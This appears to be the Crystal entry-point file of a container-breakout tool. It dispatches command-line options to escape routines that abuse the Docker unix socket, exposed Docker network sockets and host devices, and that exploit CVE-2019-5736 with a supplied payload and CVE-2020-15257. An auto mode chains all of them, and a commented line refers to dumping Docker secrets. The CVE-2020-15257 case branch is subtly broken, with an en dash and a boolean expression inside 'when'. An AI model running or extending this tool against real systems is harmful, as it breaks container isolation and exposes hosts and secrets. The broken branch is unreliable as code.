require "./utils/*"
require "./checks/*"
require "./breakouts/*"
require "net_sample"
require "docker"

def main
  logo()
  #user_namespace_enabled=false
  if ARGV.size>0
    case ARGV[0].to_s
      when "check"
        in_container?
        auto()
      when "auto"
        in_container?
        auto()
      when "unix"
        attempt_unix_socket_breakout()
      when "network"
        attempt_network_socket_breakout()
      when "device"
        attempt_device_breakout()
      when "cve-2019-5736"
        if ARGV.size > 1
          payload = ARGV[1]
          puts(payload)
          attempt_cve_2019_5736(payload)
        else
          puts("No payload supplied.")
          exit(1)
        end
      when "cve-2020–15257" && cve_2020_15257_check()
          attempt_cve_2020_15257()
      else
        usage()
    end
  else
    usage()
  end
end

## Attempts automatic checks and breakouts if the auto flag is used
def auto
  section_banner_green("Start common breakout techniques")
  attempt_device_breakout()
  attempt_unix_socket_breakout()
  attempt_network_socket_breakout()
  attempt_capability_breakout()
  attempt_cve_2020_15257_breakout()
end

def attempt_device_breakout()
  if device_check
    device_breakout
  end
end

def attempt_capability_breakout()
  if capability_check
    puts("Capability breakout not implemented")
  end
end

def attempt_unix_socket_breakout()
  if unix_socket_present?
    socket_breakout("/var/run/docker.sock")
  end
end

def attempt_network_socket_breakout()
  host_and_port = find_network_socket()

  if host_and_port
    if host_and_port.size() > 0
      # list_running_containers(url)
      # dump_docker_secrets(host_and_port)
      socket_breakout(host_and_port[0].to_s,host_and_port[1].to_i)
    end
  end
end

def attempt_cve_2020_15257_breakout()
  if cve_2020_15257_check()
    attempt_cve_2020_15257()
  end
end

main()
